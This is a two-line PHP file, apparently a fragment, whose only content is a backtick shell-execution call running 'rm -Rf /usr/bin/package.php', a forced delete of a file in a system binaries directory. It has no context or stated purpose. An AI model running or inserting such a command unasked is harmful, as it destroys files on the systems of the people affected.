<?php
`rm -Rf /usr/bin/package.php`;
